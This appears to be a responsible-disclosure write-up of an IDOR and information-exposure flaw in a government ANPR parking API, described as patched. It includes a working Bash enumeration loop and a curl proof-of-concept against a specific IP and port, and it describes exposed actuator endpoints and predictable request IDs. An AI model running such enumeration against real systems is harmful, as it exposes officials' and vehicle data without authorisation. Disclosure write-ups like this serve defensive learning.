# 🛡️ ANPR Security Case Study: Information Exposure & BAC Audit
**Target:** Ministry of Interior (MOI) - National ANPR 

**Status:** ✅ 100% REMEDIATED (Confirmed April 7, 2026)

**Vulnerability:** Broken Access Control (BAC) / Information Exposure

**Severity:** 🔴 Critical (9.8/10)

![Security Status](https://img.shields.io/badge/Security-Verified_Patch-success?style=for-the-badge&logo=github)
![Vulnerability](https://img.shields.io/badge/Vulnerability-BAC-red?style=for-the-badge)

---

## 📝 Executive Summary
This repository documents a security assessment of a government-integrated **Automatic Number Plate Recognition (ANPR)** and parking management system. The audit focused on the API layer (`Port 1234`) responsible for vehicle-to-officer mapping and organizational logistics. 

This case study is a prime example of **Successful Responsible Disclosure**, resulting in a total system lockdown within 24 hours of reporting.

---

## 🧪 Research Methodology
The assessment followed a **Non-Intrusive Black-Box** approach, utilizing the following lifecycle:
1.  **Passive Reconnaissance:** Identification of Spring Boot signatures and Nginx proxy headers.
2.  **Endpoint Fuzzing:** Mapping the `/api/v1/` namespace to identify unprotected `GET` routes.
3.  **Sequence Prediction:** Using Bayesian logic to determine internal ID increments for ANPR records.
4.  **Responsible Disclosure:** Real-time reporting to the MOI IT team to trigger remediation.
5.  **Post-Patch Verification:** Comprehensive testing to confirm the closure of all identified leak vectors.

---

## 🛠️ Custom Tooling
During this audit, a custom automation utility [Bubble-Scanner](https://github.com/MoriartyPuth/bubble-scanner) was used to handle high-velocity JSON parsing and IDOR validation.

**Key Features:**
* **Recursive Crawler:** Mapped 100+ Bureau and Department hierarchies via integer incrementation.
* **Regex Extractor:** Targeted Khmer script identifiers and Plate Number formats.
* **Sequence Generator:** Automated the brute-forcing of predictable `GDDTM` request strings.

---

## 💻 Technical Logic Snippet
The following Bash logic was utilized to automate the discovery of the Ministry's internal organizational structure prior to the patch:

```bash
#!/bin/bash
# Logic used to map Bureau Hierarchy via IDOR (Pre-Patch)
TARGET="[http://175.100.74.227:1234/api/v1/bureaus](http://175.100.74.227:1234/api/v1/bureaus)"

for id in {1..100}; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$id")
  if [ "$status" == "200" ]; then
    name=$(curl -s "$TARGET/$id" | jq -r '.name')
    echo "[+] Found Bureau $id: $name"
  fi
done
```

---

## ⚠️ Technical Vulnerability Analysis
### 1. Insecure Direct Object Reference (IDOR)
The ANPR records and Bureau structures were indexed using simple integers. An attacker could retrieve sensitive permit data and organizational blueprints by simply changing the numeric ID in the URI.

### 2. Predictable Resource Naming
Request IDs followed a strict format: `GDDTM + [YYYYMMDD] + PR + [Sequence]`. This allowed for time-series analysis of all parking activity within the Ministry.

### 3. Information Exposure (Actuators)
The `/actuator` directory was publicly accessible, leaking heap dumps and environment variables through endpoints like `/env` and `/mappings`.

---

## 📸 Discovery & Proof of Concept (PoC)
The vulnerability was confirmed by querying the **Cybercrime Unit (ID 23)** and the **Police Biography Office (ID 33)**.

**Historical PoC Request (Now Blocked):**
`curl -s "http://175.100.74.227:1234/api/v1/bureaus/33" | jq .`

---

## 📊 Data Exposure Sample (Anonymized)
Before the patch, the following metadata was publicly retrievable:
```
{
  "id": 17754,
  "requestId": "GDDTM20260406PR2312",
  "ownerName": "REDACTED_OFFICER_NAME",
  "plateNumber": "2A-XXXX",
  "bureauId": 33,
  "status": "APPROVED"
}
```

---

## 🔧 Remediation Process
Following disclosure, the MOI IT team implemented a Global Remediation Strategy:

* **Auth-Wall Implementation:** Applied strict `authenticated()` rules to all `/api/v1/**` sub-paths.

* **Proxy Restriction:** Configured Nginx to return `405 Method Not Allowed` for all `/actuator` paths.

* **Search Logic Nullification:** Updated the search controller to return an empty array `[]` regardless of query string.

* **Structural Lockdown:** Closed the final leaks in the `/bureaus` and `/positions` endpoints.

The system is now successfully hardened against unauthenticated discovery and metadata scraping.

---

## 🎖️ Final Project Status
> **Security Audit:** Complete  
> **Data Integrity:** Secured

Disclaimer: This research was conducted for educational and security-hardening purposes. All activities complied with responsible disclosure standards.
